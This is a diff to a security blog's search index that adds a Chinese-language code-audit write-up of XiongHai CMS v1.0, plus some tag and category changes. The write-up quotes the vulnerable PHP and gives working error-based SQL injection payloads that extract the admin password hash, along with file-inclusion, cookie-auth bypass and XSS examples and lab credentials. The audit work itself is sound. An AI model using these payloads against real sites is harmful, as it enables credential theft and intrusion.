@@ -46,6 +46,108 @@
 ]]></content>
   </entry>
   <entry>
+    <title>[代码审计]熊海cms v1.0整站审计</title>
+    <url>/2022/11/08/xhcms/</url>
+    <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>早上11点起来，准备把新手入门的熊海cms代审一遍，结果一点就得去练车了，到现在才写完，懒狗！</p>
+<p>整个站主要功能都在管理员，用户页面挺少功能，而且也不是什么框架，就是拿seay扫都能扫出一大堆洞，不然怎么叫新手洞呢</p>
+<p>Mysql账号密码 l3&#x2F;Qwerty123</p>
+<p>Admin账号密码 admin&#x2F;Qwerty123</p>
+<h1 id="0x02-漏洞"><a href="#0x02-漏洞" class="headerlink" title="0x02 漏洞"></a>0x02 漏洞</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>index.php和&#x2F;admin&#x2F;index.php一致</p>
+<pre><code>&lt;?php
+//单一入口模式
+error_reporting(0); //关闭错误显示
+$file=addslashes($_GET[&#39;r&#39;]); //接收文件名
+$action=$file==&#39;&#39;?&#39;index&#39;:$file; //判断为空或者等于index
+include(&#39;files/&#39;.$action.&#39;.php&#39;); //载入相应文件
+?&gt;
+</code></pre>
+<p>只对参数进行addslashes转义，没有过滤，任意文件包含</p>
+<p><img src="https://s2.loli.net/2022/11/08/psURTmxXqy1Oegb.png" alt="image.png"></p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>&#x2F;admin&#x2F;files&#x2F;login.php</p>
+<pre><code>$login=$_POST[&#39;login&#39;];
+$user=$_POST[&#39;user&#39;];
+$password=$_POST[&#39;password&#39;];
+$checkbox=$_POST[&#39;checkbox&#39;];
+
+if ($login&lt;&gt;&quot;&quot;)&#123;
+$query = &quot;SELECT * FROM manage WHERE user=&#39;$user&#39;&quot;;
+$result = mysql_query($query) or die(&#39;SQL语句有误：&#39;.mysql_error());
+$users = mysql_fetch_array($result);
+
+if (!mysql_num_rows($result)) &#123;  
+echo &quot;&lt;Script language=JavaScript&gt;alert(&#39;抱歉，用户名或者密码错误。&#39;);history.back();&lt;/Script&gt;&quot;;
+exit;
+&#125;else&#123;
+$passwords=$users[&#39;password&#39;];
+if(md5($password)&lt;&gt;$passwords)&#123;
+echo &quot;&lt;Script language=JavaScript&gt;alert(&#39;抱歉，用户名或者密码错误。&#39;);history.back();&lt;/Script&gt;&quot;;
+exit; 
+  &#125;
+</code></pre>
+<blockquote>
+<p>传递user和password，并未进行过滤</p>
+</blockquote>
+<blockquote>
+<p>·进行user查询，存在user的话就继续password的md5比较，与数据库的比对</p>
+</blockquote>
+<p>在user这进行admin报错注入，由于回显的md5值不对，需进行两次注入才能得到密码</p>
+<pre><code>admin&#39; or extractvalue(1,concat((select concat(0x7e,password) from manage)))#
+admin&#39; or extractvalue(1,concat((select concat(password,0x7e) from manage)))#
+</code></pre>
+<p><img src="https://s2.loli.net/2022/11/08/Gblt7kPSf36IFzg.png" alt="image.png"></p>
+<p>&#x2F;admin&#x2F;files&#x2F;newlink.php</p>
+<pre><code>$save=$_POST[&#39;save&#39;];
+$name=$_POST[&#39;name&#39;];
+$url=$_POST[&#39;url&#39;];
+$mail=$_POST[&#39;mail&#39;];
+$jieshao=$_POST[&#39;jieshao&#39;];
+$xs=$_POST[&#39;xs&#39;];
+
+$query = &quot;INSERT INTO link (name,url,mail,jieshao,xs,date) VALUES (&#39;$name&#39;,&#39;$url&#39;,&#39;$mail&#39;,&#39;jieshao&#39;,&#39;xs&#39;,now())&quot;;
+</code></pre>
+<p>插入语句也并未过滤，使用报错注入</p>
+<pre><code>&#39; or updatexml(1,concat(1,(select concat(0x7e,password,0x7e) from manage)),1) or &#39;
+</code></pre>
+<p>&#x2F;admin&#x2F;files&#x2F;columnlist.php和&#x2F;admin&#x2F;files&#x2F;columentlist.php一样</p>
+<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>&#x2F;inc&#x2F;checklogin.php</p>
+<pre><code>&lt;?php
+$user=$_COOKIE[&#39;user&#39;];
+if ($user==&quot;&quot;)&#123;
+header(&quot;Location: ?r=login&quot;);
+exit;   
+&#125;
+?&gt;
+</code></pre>
+<p><img src="https://s2.loli.net/2022/11/08/WRoezsrbNkAKJat.png" alt="image.png"></p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>反射XSS，在&#x2F;files&#x2F;contact.php</p>
+<pre><code>$page=addslashes($_GET[&#39;page&#39;]); 
+</code></pre>
+<p>仅仅转义，不够</p>
+<p><img src="https://s2.loli.net/2022/11/08/haMYfngr1VzyPGB.png" alt="image.png"></p>
+<p>存储XSS，在&#x2F;admin&#x2F;files&#x2F;manageinfo.php</p>
+<pre><code>$user=$_POST[&#39;user&#39;];
+$name=$_POST[&#39;name&#39;];
+$password=$_POST[&#39;password&#39;];
+$password2=$_POST[&#39;password2&#39;];
+$img=$_POST[&#39;img&#39;];
+$mail=$_POST[&#39;mail&#39;];
+$qq=$_POST[&#39;qq&#39;];
+</code></pre>
+<p>将语句写入到服务器中</p>
+<pre><code>&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;
+</code></pre>
+<p><img src="https://s2.loli.net/2022/11/08/dwQkzHiFrNOe96R.png" alt="image.png"></p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://blog.csdn.net/lleo1/article/details/120515505">https://blog.csdn.net/lleo1/article/details/120515505</a></p>
+<p><a href="https://blog.csdn.net/weixin_44604541/article/details/118602925">https://blog.csdn.net/weixin_44604541/article/details/118602925</a></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2022/11/07</title>
     <url>/2022/11/07/%E6%97%A5%E8%AE%B0-20221007/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -394,6 +496,9 @@ $ffi -&gt;system(&quot;ls / &gt; /tmp/res.txt&quot;);   # 执行ls /命令并将
       <categories>
         <category>渗透测试</category>
       </categories>
+      <tags>
+        <tag>总结</tag>
+      </tags>
   </entry>
   <entry>
     <title>[漏洞复现]用友 BeanShell命令执行</title>
@@ -460,6 +565,9 @@ if __name__ == &#39;__main__&#39;:
       <categories>
         <category>渗透测试</category>
       </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
   </entry>
   <entry>
     <title>[漏洞复现]Monstra V3.0.4 文件上传</title>
@@ -748,8 +856,7 @@ dict(__clas=a,s__=b)|join 获取__class__
         <category>CTF刷题</category>
       </categories>
       <tags>
-        <tag>SSTI</tag>
-        <tag>Flask</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1235,7 +1342,7 @@ msf6 auxiliary(server/socks_proxy) &gt; jobs
         <category>内网渗透</category>
       </categories>
       <tags>
-        <tag>代理转发</tag>
+        <tag>内网</tag>
       </tags>
   </entry>
   <entry>
@@ -1693,7 +1800,7 @@ msf6 &gt; run
 <p><a href="https://www.0xby.com/4312.html">https://www.0xby.com/4312.html</a></p>
 ]]></content>
       <categories>
-        <category>其他</category>
+        <category>渗透测试</category>
       </categories>
       <tags>
         <tag>小程序</tag>
